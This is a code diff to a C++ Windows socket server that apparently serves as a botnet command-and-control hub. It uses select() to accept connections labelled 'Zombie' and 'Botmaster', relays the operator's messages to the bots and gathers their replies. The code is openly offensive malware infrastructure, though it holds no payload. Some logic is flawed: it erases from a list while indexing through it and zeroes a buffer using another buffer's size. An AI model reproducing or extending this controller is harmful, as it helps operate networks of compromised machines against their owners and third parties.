@@ -59,36 +59,58 @@ bool Server::createListeningSocket()
 	}
 }
 
-int Server::waitForConnection()
+void Server::waiting()
 {
-	SOCKET m_Client = accept(m_Listening, nullptr, nullptr);
-	if (m_Client == INVALID_SOCKET)
-		return WEIRDO;
-	else
+	FD_ZERO(&m_Readfds);
+	FD_SET(m_Listening, &m_Readfds);
+	if(m_Botmaster != INVALID_SOCKET)	//Botmaster may not be logined
+		FD_SET(m_Botmaster, &m_Readfds);
+
+	SOCKET maxSd = m_Botmaster > m_Listening ? m_Botmaster : m_Listening;
+
+	for (SOCKET zombie : m_Zombies)
 	{
-		char buf[4096];
-		if (recv(m_Client, buf, sizeof(buf), 0))
+		FD_SET(zombie, &m_Readfds);		//already checked in acceptConnection() that its a valid socket
+		maxSd = zombie > maxSd ? zombie : maxSd;
+	}
+
+	m_RdySocket = select(maxSd + 1, &m_Readfds, NULL, NULL, NULL);	//first parameter range in which he checks all sockets
+}
+
+int Server::acceptConnection()
+{
+	if (FD_ISSET(m_Listening, &m_Readfds))
+	{
+		SOCKET m_Client = accept(m_Listening, nullptr, nullptr);
+		if (m_Client == INVALID_SOCKET)
+			return WEIRDO;
+		else
 		{
-			std::string tmp = buf;
-			if (tmp.substr(0, 6) == "Zombie")
+			char buf[4096];
+			if (recv(m_Client, buf, sizeof(buf), 0))
 			{
-				m_Zombies.push_back(m_Client);
-				return ZOMBIE;
+				std::string tmp = buf;
+				if (tmp.substr(0, 6) == "Zombie")
+				{
+					m_Zombies.push_back(m_Client);
+					return ZOMBIE;
+				}
+				else if (tmp.substr(0, 9) == "Botmaster" && m_Botmaster == INVALID_SOCKET)
+				{
+					m_Botmaster = m_Client;
+					return BOTMASTER;
+				}
+				else
+				{
+					return WEIRDO;
+				}
 			}
-			else if (tmp.substr(0, 9) == "Botmaster" && m_Botmaster == INVALID_SOCKET)
-			{
-				m_Botmaster = m_Client;
-				return BOTMASTER;
+			else {
+				return WEIRDO;	//todo endless loop stops server from doing things
 			}
-			else
-			{
-				return WEIRDO;
-			}
-		}
-		else {
-			return WEIRDO;	//todo endless loop stops server from doing things
 		}
 	}
+	return -1;
 }
 
 void Server::sendToZombies(const std::string& msg)
@@ -115,13 +137,58 @@ bool Server::sendToBotmaster(const std::string& msg)
 
 bool Server::receive()
 {
-	//int received = recv(m_Zom, m_Buf, sizeof(m_Buf), 0);
-	//if (received == SOCKET_ERROR || received == 0)	//received == 0 means that the connection got closed gracefully
-	//	return false;
-	return true;
+	bool rcvAnything = false;
+
+	m_BotMasterBuf.clear();
+	char botMasterBuf[4096];
+	SecureZeroMemory(botMasterBuf, sizeof(botMasterBuf));
+	if (FD_ISSET(m_Botmaster, &m_Readfds))
+	{
+		int received = recv(m_Botmaster, botMasterBuf, sizeof(botMasterBuf), 0);
+		if (received == SOCKET_ERROR || received == 0)	//received == 0 means that the connection got closed gracefully
+		{
+			closesocket(m_Botmaster);
+			m_Botmaster = INVALID_SOCKET;
+		}
+		else
+		{
+			m_BotMasterBuf = botMasterBuf;
+		}
+		rcvAnything = true;
+	}
+
+	m_BotBufs.clear();
+	for (int i = 0; i < m_Zombies.size(); i ++)
+	{
+		char botBuf[4096];
+		SecureZeroMemory(botBuf, sizeof(botMasterBuf));
+		if (FD_ISSET(m_Zombies[i], &m_Readfds))
+		{
+			int received = recv(m_Zombies[i], botBuf, sizeof(botBuf), 0);
+			if (received == SOCKET_ERROR || received == 0)	//received == 0 means that the connection got closed gracefully
+			{
+				closesocket(m_Zombies[i]);
+				m_Zombies.erase(m_Zombies.begin() + i);
+			}
+			else
+			{
+				m_BotBufs.push_back(std::pair<SOCKET, std::string>(m_Zombies[i], botBuf));
+			}
+			rcvAnything = true;
+		}
+	}
+	return rcvAnything;
 }
 
-std::string Server::getMessage()
+std::string Server::getBotMasterMessage()
 {
-	return m_Buf;
+	return m_BotMasterBuf;
+}
+
+std::vector<std::string> Server::getBotMessages()
+{
+	std::vector<std::string> msgs;
+	for(auto msg : m_BotBufs)
+		msgs.push_back(msg.second);
+	return msgs;
 }
